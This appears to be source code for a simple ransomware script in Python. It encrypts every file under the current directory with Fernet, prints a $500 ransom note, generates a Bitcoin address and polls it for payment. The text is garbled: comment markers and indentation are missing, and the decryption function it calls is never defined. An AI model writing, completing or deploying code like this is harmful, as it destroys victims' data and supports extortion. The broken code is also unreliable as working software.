import os
import sys
import time
import cryptography
from cryptography.fernet import Fernet
import pycoinnet
Generate a key and save it to a file

key = Fernet.generate_key()
with open('key.key', 'wb') as key_file:
key_file.write(key)
Encrypt all files in the current directory and its subdirectories

def encrypt_files(directory):
for foldername, subfolders, filenames in os.walk(directory):
for filename in filenames:
file_path = os.path.join(foldername, filename)
with open(file_path, 'rb') as file:
file_data = file.read()
encrypted_data = Fernet(key).encrypt(file_data)
with open(file_path, 'wb') as file:
file.write(encrypted_data)

encrypt_files('.')
Display a ransom note

print("""

*** YOUR FILES HAVE BEEN ENCRYPTED! ***

*** To decrypt your files, you must pay a ransom of ﹩500. ***
*** Instructions for payment will be provided after ***
*** you have made the payment. Do not attempt to decrypt ***
*** the files yourself or you will destroy them permanently.***

""")
Set up a Bitcoin wallet to receive payments

wallet = pycoinnet.Wallet()
address = wallet.get_new_address()
print("Send the ransom to this Bitcoin address:", address)
Check for incoming payments every 60 seconds

while True:
time.sleep(60)
payments = pycoinnet.list_transactions(address)
for payment in payments:
if payment['amount'] > 0:
Decrypt the files

with open('key.key', 'rb') as key_file:
key = key_file.read()
fernet = Fernet(key)
decrypt_files('.')
print("Your files have been decrypted.")
sys.exit()
